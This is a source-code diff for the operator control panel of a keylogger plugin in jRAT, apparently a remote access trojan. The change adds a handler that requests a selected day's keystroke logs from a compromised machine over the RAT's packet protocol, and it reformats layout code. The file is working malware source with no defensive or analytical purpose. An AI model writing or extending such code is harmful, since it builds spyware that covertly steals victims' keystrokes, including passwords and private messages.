@@ -24,6 +24,7 @@ import javax.swing.text.Style;
 import javax.swing.text.StyleConstants;
 import javax.swing.tree.DefaultMutableTreeNode;
 import javax.swing.tree.DefaultTreeModel;
+import javax.swing.tree.TreePath;
 
 import pro.jrat.api.BaseControlPanel;
 import pro.jrat.api.PacketBuilder;
@@ -33,10 +34,9 @@ import pro.jrat.plugin.client.KeyloggerPlugin;
 import javax.swing.event.TreeSelectionListener;
 import javax.swing.event.TreeSelectionEvent;
 
-
 @SuppressWarnings("serial")
 public class PanelKeylogger extends BaseControlPanel {
-	
+
 	public JTextPane offlineTextPane;
 	private final ButtonGroup buttonGroup = new ButtonGroup();
 	private JCheckBox chckbxDeleteCharOn;
@@ -47,7 +47,7 @@ public class PanelKeylogger extends BaseControlPanel {
 
 	@SuppressWarnings("deprecation")
 	public PanelKeylogger() {
-		
+
 		JToggleButton tglbtnEnable = new JToggleButton("Enable");
 		tglbtnEnable.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
@@ -56,7 +56,7 @@ public class PanelKeylogger extends BaseControlPanel {
 			}
 		});
 		buttonGroup.add(tglbtnEnable);
-		
+
 		JToggleButton tglbtnDisable = new JToggleButton("Disable");
 		tglbtnDisable.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
@@ -66,110 +66,106 @@ public class PanelKeylogger extends BaseControlPanel {
 		});
 		buttonGroup.add(tglbtnDisable);
 		tglbtnDisable.setSelected(true);
-		
+
 		chckbxDeleteCharOn = new JCheckBox("Delete char on backspace");
-		
+
 		JScrollPane scrollPane_1 = new JScrollPane();
-		
+
 		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
 		GroupLayout groupLayout = new GroupLayout(this);
-		groupLayout.setHorizontalGroup(
-			groupLayout.createParallelGroup(Alignment.TRAILING)
-				.addGroup(groupLayout.createSequentialGroup()
-					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
-						.addGroup(groupLayout.createSequentialGroup()
-							.addContainerGap()
-							.addComponent(tglbtnEnable)
-							.addPreferredGap(ComponentPlacement.RELATED)
-							.addComponent(tglbtnDisable)
-							.addPreferredGap(ComponentPlacement.UNRELATED)
-							.addComponent(chckbxDeleteCharOn))
-						.addGroup(groupLayout.createSequentialGroup()
-							.addGap(1)
-							.addComponent(scrollPane_1, GroupLayout.PREFERRED_SIZE, 128, GroupLayout.PREFERRED_SIZE)
-							.addPreferredGap(ComponentPlacement.RELATED)
-							.addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 305, Short.MAX_VALUE)))
-					.addContainerGap())
-		);
-		groupLayout.setVerticalGroup(
-			groupLayout.createParallelGroup(Alignment.TRAILING)
-				.addGroup(groupLayout.createSequentialGroup()
-					.addGroup(groupLayout.createParallelGroup(Alignment.TRAILING)
-						.addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 359, Short.MAX_VALUE)
-						.addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 254, Short.MAX_VALUE))
-					.addPreferredGap(ComponentPlacement.RELATED)
-					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
-						.addComponent(tglbtnEnable)
-						.addComponent(tglbtnDisable)
-						.addComponent(chckbxDeleteCharOn))
-					.addGap(15))
-		);
-		
+		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(tglbtnEnable).addPreferredGap(ComponentPlacement.RELATED).addComponent(tglbtnDisable).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(chckbxDeleteCharOn)).addGroup(groupLayout.createSequentialGroup().addGap(1).addComponent(scrollPane_1, GroupLayout.PREFERRED_SIZE, 128, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 305, Short.MAX_VALUE))).addContainerGap()));
+		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 359, Short.MAX_VALUE).addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 254, Short.MAX_VALUE)).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(tglbtnEnable).addComponent(tglbtnDisable).addComponent(chckbxDeleteCharOn)).addGap(15)));
+
 		Icon offlineIcon = null;
-		
+
 		try {
 			offlineIcon = new ImageIcon(new File(System.getProperty("jrat.dir") + File.separator + "plugins/Keylogger/offline.png").toURL());
 		} catch (Exception e2) {
 			e2.printStackTrace();
 		}
-		
+
 		JScrollPane offlineScrollPane = new JScrollPane();
 		tabbedPane.addTab("Offline", offlineIcon, offlineScrollPane, null);
 		offlineScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
 		offlineScrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
-		
+
 		offlineTextPane = new JTextPane();
 		offlineTextPane.setEditable(false);
 		offlineScrollPane.setViewportView(offlineTextPane);
-		
+
 		Icon onlineIcon = null;
 		try {
 			onlineIcon = new ImageIcon(new File(System.getProperty("jrat.dir") + File.separator + "plugins/Keylogger/online.png").toURL());
 		} catch (Exception e1) {
 			e1.printStackTrace();
 		}
-		
+
 		JScrollPane onlineScrollPane = new JScrollPane();
 		onlineScrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
 		onlineScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
 		tabbedPane.addTab("Online", onlineIcon, onlineScrollPane, null);
-		
+
 		onlineTextPane = new JTextPane();
 		onlineScrollPane.setViewportView(onlineTextPane);
-		
+
 		title = offlineTextPane.addStyle("title", null);
 		onlineTextPane.addStyle("title", title);
 
 		tree = new JTree();
 		tree.addTreeSelectionListener(new TreeSelectionListener() {
-			public void valueChanged(TreeSelectionEvent arg0) {
-				// TODO arg0.getPath().getLastPathComponent();
+			public void valueChanged(TreeSelectionEvent event) {
+				Object node = event.getPath().getLastPathComponent();
+
+				if (node instanceof DayTreeNode) {		
+					String path = "";
+					
+					for (int i = 1; i < event.getPath().getPath().length; i++) {
+						DefaultMutableTreeNode tp = (DefaultMutableTreeNode)event.getPath().getPath()[i];
+						
+						path += tp.toString() + "/";
+					}
+					
+					final String finalPath = path;
+					
+					System.out.println(path);
+					
+					try {
+						getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOG_HEADER, getServer()) {
+							@Override
+							public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
+								System.out.println("WRITE UTF");
+								dos.writeUTF(finalPath);
+								System.out.println("WROTE UTF");
+							}
+						});
+					} catch (Exception e) {
+						e.printStackTrace();
+					}
+				}
 			}
 		});
 		tree.setShowsRootHandles(true);
-		tree.setModel(new DefaultTreeModel(
-			new DefaultMutableTreeNode("Dates")
-		));
+		tree.setModel(new DefaultTreeModel(new DefaultMutableTreeNode("Dates")));
 		scrollPane_1.setViewportView(tree);
 		setLayout(groupLayout);
-        StyleConstants.setForeground(title, Color.green.darker());
-        
-        try {
+		StyleConstants.setForeground(title, Color.green.darker());
+
+		try {
 			getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, getServer()) {
 				@Override
-				public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
-					
+				public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
+
 				}
 			});
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
 	}
-	
+
 	public DefaultMutableTreeNode getRoot() {
 		return (DefaultMutableTreeNode) tree.getModel().getRoot();
 	}
-	
+
 	public synchronized void delete() throws Exception {
 		String text = offlineTextPane.getText().trim();
 		if (text.endsWith("]")) {
@@ -178,7 +174,7 @@ public class PanelKeylogger extends BaseControlPanel {
 			offlineTextPane.getStyledDocument().remove(offlineTextPane.getDocument().getLength() - 1, 1);
 		}
 	}
-	
+
 	public synchronized void append(String key) {
 		try {
 			if (key.equals("[BACKSPACE]") && chckbxDeleteCharOn.isSelected()) {
@@ -189,19 +185,19 @@ public class PanelKeylogger extends BaseControlPanel {
 			} else {
 				onlineTextPane.getStyledDocument().insertString(onlineTextPane.getStyledDocument().getLength(), key.length() == 1 ? key : key + " ", null);
 			}
-			
+
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
-		
+
 		onlineTextPane.setSelectionStart(onlineTextPane.getDocument().getLength());
-		onlineTextPane.setSelectionEnd(onlineTextPane.getDocument().getLength());	
+		onlineTextPane.setSelectionEnd(onlineTextPane.getDocument().getLength());
 
 	}
 
 	@Override
 	public void onClose() {
-		
+
 	}
 
 	public JTree getTree() {
